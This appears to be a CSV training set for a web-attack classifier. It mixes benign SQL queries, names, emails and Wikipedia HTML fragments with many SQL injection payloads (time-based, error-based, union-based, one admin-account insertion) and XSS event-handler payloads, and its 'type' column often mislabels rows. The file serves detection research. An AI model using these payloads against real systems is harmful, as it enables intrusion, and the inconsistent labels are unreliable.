Text,Label,type
"1""   )    )    as uzvu where 2458  =  2458 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,xss
reto8sivo,0,sql
"<style ondblclick=""alert(1)"">test</style>",2,xss
" SELECT * FROM suggest ORDER BY bark, branch",0,sql
hendrika@kayaalicante.sc,0,sql
SELECT AVG ( Price ) FROM tried,0,xss
chinaphan@viajesdacapalla.eh,0,sql
"<colgroup oncopy=""alert(1)"" contenteditable>test</colgroup>",2,xss
velen,0,sql
SELECT * FROM having 3,0,sql
SELECT passage FROM wooden,0,sql
SELECT * FROM buffalo WHERE Price NOT BETWEEN 10 AND 20,0,xss
SELECT TOP 50 PERCENT * FROM fuel SELECT * FROM owner FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM tin,0,sql
"  UPDATE broad SET moving =  'spin', City =  'mixture' WHERE corn =  which",0,sql
manquel,0,sql
"<data onmouseover=""alert(1)"">test</data>",2,xss
"<em oncut=""alert(1)"" contenteditable>test</em>",2,xss
-4954'  )   or 8571  =  8571--,1,sql
62776679l,0,sql
SELECT * FROM dozen  WHERE clearly NOT LIKE '[frozen]%',0,sql
DELETE FROM fewer,0,sql
"<kbd onmouseleave=""alert(1)"">test</kbd>",2,xss
" SELECT * FROM certain ORDER BY judge, dinner",0,sql
"   SELECT guide, wonder, brief FROM lift WHERE outline  IS NULL",0,sql
"<li><a href=""/wiki/Glossary_of_calculus"" title=""Glossary of calculus"">Calculus </a> </li>",0,xss
"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
34844,0,sql
SELECT AVG ( last ) FROM tonight SELECT SUM ( make ) ,0,sql
"<li id=""cite_note-Machine_learning-117""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Machine_learning_117-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Machine_learning_117-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',1,sql
-9072  )   as saot where 2278  =  2278 order by 1#,1,xss
"1   )    )     )   union all select null,null,null,null,null,null,null#",1,xss
"coslada 83, 4g",0,xss
"<frameset draggable=""true"" ondrag=""alert(1)"">test</frameset>",2,xss
SELECT * FROM  ( SELECT slide FROM breath ) ,0,sql
SELECT * FROM flat WHERE drop BETWEEN pale09/01/1996weigh AND began15/31/1996known,0,sql
1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,1,sql
34964894h,0,sql
"-2821""   )    )     )   union all select 3920,3920,3920,3920,3920,3920,3920#",1,sql
	 </span> 2016 ,0,xss
falset,0,sql
"INSERT INTO town  ( continued, order, would )  VALUES  ( 'sell', 'cake', 'industrial' )  ",0,sql
//*,1,sql
SELECT MIN ( spirit )  AS plastic FROM expect,0,sql
"select * from generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   limit 1--",1,sql
8485,0,sql
SELECT * FROM railroad WHERE stepped  BETWEEN 10 AND 20,0,sql
"<style>@keyframes slidein {}</style><sup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></sup>",2,xss
"	 <div style=""padding:0em 0.25em"">",0,xss
"1%'  )   union all select null,null,null,null--",1,xss
37650,0,sql
SELECT * FROM island FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
 </li>,0,xss
SELECT orbit ( s )  FROM east LEFT JOIN,0,sql
"1""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""prhp""  =  ""prhp",1,sql
"1"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""utzr"" like ""utzr",1,xss
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'vbda' like 'vbda",1,xss
"<body onkeyup=""alert(1)"" contenteditable>test</body>",2,xss
SELECT * FROM wp_posts WHERE ID  =  262331 LIMIT 1,0,sql
"  SELECT catID AS ID, football AS held FROM plates",0,sql
chapurrar,0,xss
SELECT * FROM tell WHERE article = 'value' LIMIT 3,0,sql
<html onpointerdown=alert(1)>XSS</html>,2,xss
8695,0,sql
SELECT AVG ( cool ) FROM cowboy SELECT SUM ( floor ) ,0,xss
48551498q,0,sql
"  SELECT arrangement,worse FROM soft WHERE wrong = 'wet' UNION SELECT rubbed, appearance FROM through",0,sql
kriz,0,sql
" || myappadmin.adduser  (  'admin', 'newpass'  )   || '",1,sql
"1%"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
SELECT AVG ( shaking ) FROM account,0,sql
"	 </span>. <i>Science </i>. <b>291 </b> (5504): 599–600. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.291.5504.599"">10.1126/science.291.5504.599 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/11229402"">11229402 </a> &#8211; via msu.edu. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=Autonomous+mental+development+by+robots+and+animals&amp;rft.volume=291&amp;rft.issue=5504&amp;rft.pages=599-600&amp;rft.date=2001&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.291.5504.599&amp;rft_id=info%3Apmid%2F11229402&amp;rft.aulast=Weng&amp;rft.aufirst=J.&amp;rft.au=McClelland&amp;rft.au=Pentland%2C+A.&amp;rft.au=Sporns%2C+O.&amp;rft.au=Stockman%2C+I.&amp;rft.au=Sur%2C+M.&amp;rft.au=Thelen%2C+E.&amp;rft_id=http%3A%2F%2Fwww.cse.msu.edu%2Fdl%2FSciencePaper.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<li><a href=""/wiki/Harmony_search"" class=""mw-redirect"" title=""Harmony search"">Harmony search </a> </li>",0,xss
SELECT option_value FROM wp_options WHERE option_name  =  'options_linkedin_url' LIMIT 1,0,xss
"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",1,sql
DELETE FROM industrial WHERE welcome = 'comfortable',0,sql
"1""  )   as nyzd where 5305  =  5305",1,sql
<ins id=x tabindex=1 onbeforedeactivate=alert(1)></ins><input autofocus>,2,xss
"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",1,xss
"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ocfi'  =  'ocfi",1,sql
"<li id=""cite_note-138""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-138"">^ </a> </b> ",0,xss
SELECT * FROM alone WHERE    NOT kitchen = 'or',0,xss
"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,xss
<li id=x tabindex=1 onfocus=alert(1)></li>,2,xss
" SELECT * FROM zipper ORDER BY diagram ASC, lunch DESC",0,xss
macoosh3,0,sql
SELECT MIN ( carefully )  AS dull FROM remarkable,0,sql
SELECT * FROM pour FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
1'   )    )    as cmll where 7948  =  7948 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,xss
lilias,0,xss
1'  )   as xrap where 5523  =  5523 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,sql
kokosopo,0,sql
"-4932%""   )    )    or   (  3076  =  5927  )  *5927 and    (    (   ""%""  =  """,1,sql
-8045   )    )     )   order by 1--,1,sql
"<tt draggable=""true"" ondragstart=""alert(1)"">test</tt>",2,xss
"-6519'   )    )    as tdlt where 5040  =  5040 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
SELECT whom ( s ) FROM subject INNER JOIN,0,sql
"			<div class=""after-portlet after-portlet-lang""><span class=""wb-langlinks-edit wb-langlinks-link""><a href=""https://www.wikidata.org/wiki/Special:EntityPage/Q11660#sitelinks-wikipedia"" title=""Edit interlanguage links"" class=""wbc-editpage"">Edit links </a> ",0,xss
remante,0,xss
"  SELECT own AS coming, lady AS [bend]  FROM letter",0,xss
dowser,0,sql
<script onreadystatechange=alert(1)></script>,2,xss
"	 </span> <span class=""reference-text"">",0,xss
"-3498""   )    )    as xbvb where 2056  =  2056 union all select 2056,2056,2056,2056,2056,2056,2056--",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.moma.org/calendar/exhibitions/3863"">""Thinking Machines: Art and Design in the Computer Age, 1959–1989"" </a>. <i>The Museum of Modern Art </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">23 July ",0,xss
adashevsky@theroxyblue.com,0,sql
"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",1,sql
"SELECT * FROM master WHERE rise BETWEEN ""such"" AND    ""model""",0,sql
"   SELECT Employees.ought, COUNT ( Orders.memberID )  AS lawFROM    ( OrdersINNER JOIN dig ON Orders.storeID  =  Employees.excellentID ) ",0,sql
7.17889E+15,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li> </ul>",0,xss
SELECT * FROM opinion ORDER BY forgot,0,sql
	 </span> ,0,xss
"<nobr ondblclick=""alert(1)"">test</nobr>",2,xss
cooksey,0,sql
"<li><a href=""/wiki/Software_construction"" title=""Software construction"">Software construction </a> </li>",0,xss
1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',1,xss
lloyd-pack-partain@elalamorestaurante.ir,0,sql
"<li id=""cite_note-Symbolic_learning_techniques-196""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Symbolic_learning_techniques_196-0"">^ </a> </b> ",0,xss
<nobr id=x tabindex=1 ondeactivate=alert(1)></nobr><input id=y autofocus>,2,xss
"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bkcs'  =  'bkcs",1,xss
"<noscript oncopy=""alert(1)"" contenteditable>test</noscript>",2,xss
SELECT * FROM division,0,sql
<li id=x tabindex=1 onactivate=alert(1)></li>,2,xss
"<div onbeforecopy=""alert(1)"" contenteditable>test</div>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
farid,0,sql
SELECT * FROM sum WHERE    NOT especially = 'opportunity',0,sql
"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",1,xss
"<button draggable=""true"" ondragstart=""alert(1)"">test</button>",2,xss
"<isindex draggable=""true"" ondragenter=""alert(1)"">test</isindex>",2,xss
"1  )   where 8856  =  8856 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
lemoine5@informatica2009.zr,0,sql
alcoholado sabaters,0,sql
sfiroudi,0,sql
"1"" union all select null,null,null,null,null,null,null--",1,sql
"<footer onmouseup=""alert(1)"">test</footer>",2,xss
SELECT airplane,0,sql
"<li><a href=""/wiki/Machine_translation"" title=""Machine translation"">Machine translation </a> </li>",0,xss
SELECT * FROM put  WHERE yet = exchange,0,sql
10960,0,xss
 </li>,0,xss
calle federico mompou 144 11-d,0,xss
"1"" where 9341  =  9341",1,sql
singyu,0,sql
SELECT Count ( * )  AS love,0,sql
"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",1,sql
"<ul><li><a href=""/wiki/Francis_Bacon"" title=""Francis Bacon"">Francis Bacon </a> </li>",0,xss
"1%""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,1,sql
SELECT * FROM figure WHERE moving = 'view' LIMIT 3,0,sql
-3431%'  )   or 9323  =  9323#,1,sql
jackelyn,0,xss
22655130s,0,xss
"<content oncopy=""alert(1)"" contenteditable>test</content>",2,xss
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1,sql
"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,sql
 UPDATE writer SET draw = 'simple'WHERE eat = 'gradually',0,sql
" end and   (  ""qkkn"" like ""qkkn",1,sql
"	 </span> <span class=""toctext"">Strong AI hypothesis ",0,xss
"<rp onbeforecopy=""alert(1)"" contenteditable>test</rp>",2,xss
"SELECT * FROM search WHERE tea BETWEEN ""struggle"" AND    ""fire""",0,sql
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bkag'  =  'bkag",1,sql
verghese,0,sql
1'   )    )    and 2832  =  4165--,1,sql
23710,0,sql
" SELECT column_name ( s )  FROM pack,said",0,sql
SELECT safe ( s )  FROM stranger,0,xss
"<ul><li><a href=""/wiki/Metaphysics"" title=""Metaphysics"">Metaphysics </a> </li>",0,xss
SELECT MIN ( rock )  AS average FROM dog,0,sql
1%'   )    )    and 2006  =  2006,1,sql
SELECT * FROM determine FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"iif  (  1149  =  4765,1,1/0  )  ",1,sql
"1',  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",1,sql
 </div> </td> </tr> </tbody> </table> </div>,0,xss
11203636z,0,sql
<object onpointerup=alert(1)>XSS</object>,2,xss
17744,0,sql
SELECT * FROM space WHERE adult LIKE '%situation%',0,xss
||6,1,sql
"<form oncopy=""alert(1)"" contenteditable>test</form>",2,xss
SELECT TOP 3 * FROM carefully,0,sql
SELECT COUNT ( nature ) FROM late,0,sql
SELECT column_name FROM table_name WHERE ROWNUM < =  number ;,0,sql
SELECT * FROM judge FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM troops,0,xss
<svg onpointermove=alert(1)>XSS</svg>,2,xss
SELECT * FROM supply FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",1,sql
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,sql
01449063v,0,xss
SELECT * FROM  ( SELECT shallow FROM drive ) ,0,sql
<menu onpointerleave=alert(1)>XSS</menu>,2,xss
"  SELECT bad,raw FROM spread WHERE current = 'thank' UNION SELECT subject, grow FROM parts",0,sql
SELECT MIN ( of )  AS religious FROM hat,0,sql
"c/ afluente, 82",0,sql
"<svg oncontextmenu=""alert(1)"">test</svg>",2,xss
cenicientos,0,sql
<basefont onpointerover=alert(1)>XSS</basefont>,2,xss
"1'   )    )    as nlfq where 3410  =  3410 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,sql
"<title onmouseover=""alert(1)"">test</title>",2,xss
<head id=x tabindex=1 onbeforedeactivate=alert(1)></head><input autofocus>,2,xss
"  SELECT * FROM nothing WHERE find NOT IN  ( 'power', 'football', 'soon' )  ",0,sql
"<optgroup onbeforecopy=""alert(1)"" contenteditable>test</optgroup>",2,xss
"<p>Computationalism is the position in the <a href=""/wiki/Philosophy_of_mind"" title=""Philosophy of mind"">philosophy of mind </a> that the human mind or the human brain (or both) is an information processing system and that thinking is a form of computing.<sup id=""cite_ref-403"" class=""reference""><a href=""#cite_note-403"">&#91;391&#93; </a> </sup> Computationalism argues that the relationship between mind and body is similar or identical to the relationship between software and hardware and thus may be a solution to the <a href=""/wiki/Mind-body_problem"" class=""mw-redirect"" title=""Mind-body problem"">mind-body problem </a>. This philosophical position was inspired by the work of AI researchers and cognitive scientists in the 1960s and was originally proposed by philosophers <a href=""/wiki/Jerry_Fodor"" title=""Jerry Fodor"">Jerry Fodor </a> and <a href=""/wiki/Hilary_Putnam"" title=""Hilary Putnam"">Hilary Putnam </a>.",0,xss
1'  )   where 4500  =  4500,1,xss
"1"" and   (  7597  =  8422  )  *8422 and ""gywp"" like ""gywp",1,xss
admin' or 1  =  1,1,sql
"<p>Machine learning (ML), a fundamental concept of AI research since the field's inception,<sup id=""cite_ref-115"" class=""reference""><a href=""#cite_note-115"">&#91;112&#93; </a> </sup> is the study of computer algorithms that improve automatically through experience.<sup id=""cite_ref-116"" class=""reference""><a href=""#cite_note-116"">&#91;113&#93; </a> </sup><sup id=""cite_ref-Machine_learning_117-0"" class=""reference""><a href=""#cite_note-Machine_learning-117"">&#91;114&#93; </a> </sup>",0,xss
"  SELECT * FROM body WHERE told IN  ( 'moving', 'rest', 'since' )  ",0,xss
alcolea,0,sql
"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""alkz""  =  ""alkz",1,sql
"1%'  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
august,0,sql
"SELECT * FROM practice WHERE face BETWEEN ""according"" AND    ""manner""",0,sql
7.75898E+15,0,sql
"          <dd><a href=""/en/latest/"">latest</a></dd>",0,xss
SELECT COUNT ( DISTINCT swam )  FROM produce,0,sql
leandro,0,sql
"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,1,xss
